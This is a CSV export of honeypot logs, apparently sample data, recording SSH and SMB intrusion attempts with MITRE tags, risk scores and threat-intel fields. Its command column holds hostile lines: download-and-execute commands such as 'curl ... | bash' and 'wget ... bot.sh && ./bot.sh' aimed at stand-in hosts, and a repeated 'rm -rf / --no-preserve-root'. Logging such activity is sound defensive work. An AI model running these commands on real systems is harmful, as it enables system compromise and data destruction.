id;timestamp;honeypot;ip_origen;puerto_destino;protocolo;usuario;comandos;tecnica_mitre;risk_score;severidad;malware_hash;abuseipdb_confidence;abuseipdb_country;shodan_org;vt_detections;domain_age_days
101;2026-08-25 03:02:00;dionaea;1.2.3.4;445;smb;;;T1190;0.7;high;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855;;;;;
100;2026-08-25 03:01:00;cowrie;185.220.101.5;2222;ssh;admin;wget http://example.com/payload.sh;T1059;1.0;critical;;100;DE;;0;12655
99;2026-08-25 03:00:00;cowrie;8.8.8.8;2222;ssh;root;id;T1059;0.4;medium;;0;US;Google LLC;0;N/A
98;2026-08-25 01:20:05;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;6895
97;2026-08-25 01:18:48;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;6895
96;2026-08-25 01:13:25;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;N/A
95;2026-08-25 01:07:56;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;N/A
94;2026-08-25 01:01:58;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;N/A
93;2026-08-25 00:41:54;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;1.0;critical;;13;US;Linode;0;N/A
92;2026-08-25 00:35:20;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
90;2026-08-25 00:30:59;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
89;2026-08-25 00:29:02;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
88;2026-08-25 00:24:36;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
87;2026-08-25 00:22:46;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
86;2026-08-25 00:08:08;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
84;2026-08-24 23:45:28;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
83;2026-08-24 23:39:04;cowrie;118.25.6.39;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
91;2026-08-24 23:31:44;cowrie;118.25.6.39;2222;ssh;root;wget http://example-payload.test/bot.sh;T1059;0.7;high;;;;;0;N/A
82;2026-08-24 23:20:00;cowrie;118.25.6.39;2222;ssh;root;"rm -rf / --no-preserve-root; wget http://example-payload.test/bot.sh && ./bot.sh";T1059;0.9;critical;;;;;0;N/A
